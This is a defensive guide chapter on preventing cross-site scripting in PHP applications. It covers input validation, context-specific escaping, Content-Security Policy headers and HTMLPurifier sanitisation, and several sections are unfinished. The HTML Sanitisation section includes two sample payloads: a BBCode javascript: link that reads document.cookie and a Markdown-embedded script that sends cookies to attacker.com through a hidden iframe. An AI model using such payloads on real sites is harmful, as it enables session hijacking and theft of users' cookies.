Defending Against Cross-Site Scripting Attacks
==============================================

Defending against XSS is quite possible but it needs to be applied consistently while being intolerant of exceptions and shortcuts, preferably early in the web application's development when the application's workflow is fresh in everyone's mind. Late implementation of defenses can be a costly affair.

Input Validation
----------------

Input Validation is any web application's first line of defense. That said, Input Validation is limited to knowing what the immediate usage of an untrusted input is and cannot predict where that input will finally be used when included in output. Practically all free text falls into this category since we always need to allow for valid uses of quotes, angular brackets and other characters.

Therefore, validation works best by preventing XSS attacks on data which has inherent value limits. An integer, for example, should never contain HTML special characters. An option, such as a country name, should match a list of allowed countries which likewise will prevent XSS payloads from being injected.

Input Validation can also check data with clear syntax constraints. For example, a valid URL should start with http:// or https:// but not the far more dangerous javascript: or data: schemes. In fact, all URLs derived from untrusted input must be validated for this very reason. Escaping a javascript: or data: URI has the same effect as escaping a valid URL, i.e. nothing whatsoever.

While Input Validation won't block all XSS payloads, it can help block the most obvious. We cover Input Validation in greater detail in Chapter 2.

Escaping (also Encoding)
------------------------

Escaping data on output is a method of ensuring that the data cannot be misinterpreted by the currently running parser or interpreter. The obvious examples are the less-than and greater-than sign that denote element tags in HTML. If we allowed these to be inserted by untrusted input as-is, it would allow an attacker to introduce new tags that the browser would render. As a result, we normally escape these using the &gt; and $lt; HTML named entities.

As the replacement of such special characters suggests, the intent is to preserve the meaning of the data being escaped. Escaping simply replaces characters with special meaning to the interpreter with an alternative which is usually based on a hexadecimal representation of the character or a more readable representation, such as HTML named entities, where it is safe to do so.

As my earlier diversion into explaining Context mentioned, the method of escaping varies depending on which Content data is being injected into. HTML escaping is different from Javascript escaping which is also different from URL escaping. Applying the wrong escaping strategy to a Context can result in an escaping failure, opening a hole in a web applications defenses which an attacker may be able to take advantage of.

To facilitate Context-specific escaping, it's recommended to use a class designed with this purpose in mind. PHP does not supply all the necessary escaping functionality out of the box and some of what it does offer is not as safe as popularly believed. You can find an Escaper class which I designed for the Zend Framework, which offers a more approachable solution, here.

Let's examine the escaping rules applicable to the most common Contexts: HTML Body, HTML Attribute, Javascript, URL and CSS.

Never Inject Data Except In Allowed Locations
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Before presenting escaping strategies, it's essential to ensure that your web application's templates do not misplace data. This rule refers to injecting data in sensitive areas of HTML which offer an attacker the opportunity to influence markup parsing and which do not ordinarily require escaping when used by a programmer. Consider the following examples where [...] is a data injection:

.. code-block:: html

     <script>...</script>
     
     <!--...-->
     
     <div ...="test"/>
     
     <... href="http://www.example.com"/>
     
     <style>...</style>

Each of the above locations are dangerous. Allowing data within script tags, outside of literal strings and numbers, would let an attack inject Javascript code. Data injected into HTML comments might be used to trigger Internet Explorer conditionals and other unanticipated results. The next two are more obvious as we would never want an attacker to be able to influence tag or attribute names - that's what we're trying to prevent! Finally, as with scripts, we can't allow attackers to inject directly into CSS as they may be able to perform UI Redress attacks and Javascript scripting using the Internet Explorer supported expression() function.

Always HTML Escape Before Injecting Data Into The HTML Body Context
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

The HTML Body Context refers to textual content which is enclosed in tags, for example text included between <body>, <div>, or any other pairing of tags used to contain text. Data injected into this content must be HTML escaped.

HTML Escaping is well known in PHP since it's implemented by the htmlspecialchars() function.

Always HTML Attribute Escape Before Injecting Data Into The HTML Attribute Context
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

The HTML Attribute Context refers to all values assigned to element attrbutes with the exception of attributes which are interpreted by the browser as CDATA. This exception is a little tricky but largely refers to non-XML HTML standards where Javascript can be included in event attributes unescaped. For all other attributes, however, you have the following two choices:

1. If the attribute value is quoted, you MAY use HTML Escaping; but
2. If the attribute is unquoted, you MUST use HTML Attribute Escaping.

The second option also applies where attribute quoting style may be in doubt. For example, it is perfectly valid in HTML5 to use unquoted attribute values and examples in the wild do exist. Ere on the side of caution where there is any doubt.

Always Javascript Escape Before Injecting Data Into Javascript Data Values
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Javascript data values are basically strings. Since you can't escape numbers, there is a sub-rule you can apply:

Always Validate Numbers...

Content-Security Policy
-----------------------

The root element in all our discussions about Cross-Site Scripting has been that the browser unquestionably executes all the Javascript it receives from the server whether it be inline or externally sourced. On receipt of a HTML document, the browser has no means of knowing which of the resources it contains are innocent and which are malicious. What if we could change that?
 
The Content-Security Policy (CSP) is a HTTP header which communicates a whitelist of trusted resource sources that the browser can trust. Any source not included in the whitelist can now be ignored by the browser since it's untrusted. Consider the following:
 
    X-Content-Security-Policy: script-src 'self'
 
This CSP header tells the browser to only trust Javascript source URLs pointing to the current domain. The browser will now grab scripts from this source but completely ignore all others. This means that http://attacker.com/naughty.js is not downloaded if injected by an attacker. It also means that all inline scripts, i.e. <script> tags, javascript: URIs or event attribute content are all ignored too since they are not in the whitelist.
 
If we need to use Javascript from another source besides 'self', we can extend the whitelist to include it. For example, let's include jQuery's CDN address.
 
    X-Content-Security-Policy: script-src 'self' http://code.jquery.com
 
You can add other resource directives, e.g. style-src for CSS, by dividing each resource directive and its whitelisting with a semi-colon.
 
    X-Content-Security-Policy: script-src 'self' http://code.jquery.com; style-src 'self'
 
The format of the header value is very simple. The value is constructed with a resource directive "script-src" followed by a space delimited list of sources to apply as a whitelist. The source can be a quoted keyword such as 'self' or a URL. The URL value is matched based on the information given. Information omitted in a URL can be freely altered in the HTML document. Therefore http://code.jquery.com prevents loading scripts from http://jquery.com or http://domainx.jquery.com because we were specific as to which subdomain to accept. If we wanted to allow all subdomains we could have specified just http://jquery.com. The same thinking applies to paths, ports, URL scheme, etc.
 
The nature of the CSP's whitelisting is simple. If you create a whitelist of a particular type of resource, anything not on that whitelist is ignored. If you do not define a whitelist for a resource type, then the browser's default behaviour kicks for that resource type.
 
Here's a list of the resource directives supported:
 
connect-src: Limits the sources to which you can connect using XMLHttpRequest, WebSockets, etc.
font-src: Limits the sources for web fonts.
frame-src: Limits the source URLs that can be embedded on a page as frames.
img-src: Limits the sources for images.
media-src: Limits the sources for video and audio.
object-src: Limits the sources for Flash and other plugins.
script-src: Limits the sources for script files.
style-src: Limits the sources for CSS files.
 
For maintaining secure defaults, there is also the special "default-src" directive that can be used to create a default whitelist for all of the above. For example:
 
    X-Content-Security-Policy: default-src 'self'; script-src 'self' http://code.jquery.com
 
The above will limit the source for all resources to the current domain but add an exception for script-src to allow the jQuery CDN. This instantly shuts down all avenues for untrusted injected resources and allows is to carefully open up the gates to only those sources we want the browser to trust.
 
Besides URLs, the allowed sources can use the following keywords which must be encased with single quotes:
 
'none'
'self'
'unsafe-inline'
'unsafe-eval'
 
You'll notice the usage of the term "unsafe". The best way of applying the CSP is to not duplicate an attacker's practices. Attackers want to inject inline Javascript and other resources. If we avoid such inline practices, our web applications can tell browsers to ignore all such inlined resources without exception. We can do this using external script files and Javascript's addEventListener() function instead of event attributes. Of course, what's a rule without a few useful exceptions, right? Seriously, eliminate any exceptions. Setting 'unsafe-inline' as a whitelisting source just goes against the whole point of using a CSP.
 
The 'none' keyword means just that. If set as a resource source it just tells the browser to ignore all resources of that type. Your mileage may vary but I'd suggest doing something like this so your CSP whitelist is always restricted to what it allows:
 
    X-Content-Security-Policy: default-src 'none'; script-src 'self' http://code.jquery.com; style-src 'self'
 
Just one final quirk to be aware of. Since the CSP is an emerging solution not yet out of draft, you'll need to dumplicate the X-Content-Security-Policy header to ensure it's also picked up by WebKit browsers like Safari and Chrome. I know, I know, that's WebKit for you.
 
    X-Content-Security-Policy: default-src 'none'; script-src 'self' http://code.jquery.com; style-src 'self'
    X-WebKit-CSP: default-src 'none'; script-src 'self' http://code.jquery.com; style-src 'self'

Browser Detection
-----------------

HTML Sanitisation
-----------------

At some point, a web application will encounter a need to include externally determined HTML markup directly into a web page without escaping it. Obvious examples can include forum posts, blog comments, editing forms, and entries from an RSS or Atom feed. If we were to escape the resulting HTML markup from those sources, they would never render correctly so we instead need to carefully filter it to make sure that any and all dangerous markup is neutralised.

You'll note that I used the phrase "externally determined" as opposed to externally generated. In place of accepting HTML markup, many web applications will allow users to instead use an alternative such as BBCode, Markdown, or Textile. A common fallacy in PHP is that these markup languages have a security function in preventing XSS. That is complete nonsense. The purpose of these languages is to allow users write formatted text more easily without dealing with HTML. Not all users are programmers and HTML is not exactly consistent or easy given its SGML roots. Writing long selections of formatted text in HTML is painful.

The act of generating HTML from such inputs (unless we received HTML to start with!) occurs on the server. That implies a trustworthy operation which is a common mistake to make. The HTML that results from such generators was still "determined" by an untrusted input. We can't assume it's safe. This is simply more obvious with a blog feed since its entries are already valid HTML.

Let's take the following BBCode snippet:

    [url=javascript:alert('I can haz Cookie?\n'+document.cookie)]Free Bitcoins Here![/url]

BBCode does limit the allowed HTML by design but it doesn't mandate, for example, using HTTP URLs and most generators won't notice this creeping through.

As another example, take the following selection of Markdown:

    I am a Markdown paragraph.<script>document.write('<iframe src="http://attacker.com?cookie=' + document.cookie.escape() + '" height=0 width=0 />');</script>

    There's no need to panic. I swear I am just plain text!

Markdown is a popular alternative to writing HTML but it also allows authors to mix HTML into Markdown. It's a perfectly valid Markdown feature and a Markdown renderer won't care whether there is an XSS payload included.

After driving home this point, the course of action needed is to HTML sanitise whatever we are going to include unescaped in web application output after all generation and other operations have been completed. No exceptions. It's untrusted input until we've sanitised it outselves.

HTML Sanitisation is a laborious process of parsing the input HTML and applying a whitelist of allowed elements, attributes and other values. It's not for the faint of heart, extremely easy to get wrong, and PHP suffers from a long line of insecure libraries which claim to do it properly. Do use a well established and reputable solution instead of writing one yourself.

The only library in PHP known to offer safe HTML Sanitisation is HTMLPurifier. It's actively maintained, heavily peer reviewed and I strongly recommend it. Using HTMLPurifier is relatively simple once you have some idea of the HTML markup to allow:

.. code-block:: php

    // Basic setup without a cache
    $config = HTMLPurifier_Config::createDefault();
    $config->set('Core', 'Encoding', 'UTF-8');
    $config->set('HTML', 'Doctype', 'HTML 4.01 Transitional');
    // Create the whitelist
    $config->set('HTML.Allowed', 'p,b,a[href],i'); // basic formatting and links
    $sanitiser = new HTMLPurifier($config);
    $output = $sanitiser->purify($untrustedHtml);

Do not use another HTML Sanitiser library unless you are absolutely certain about what you're doing.

External Application Defenses
-----------------------------

TBD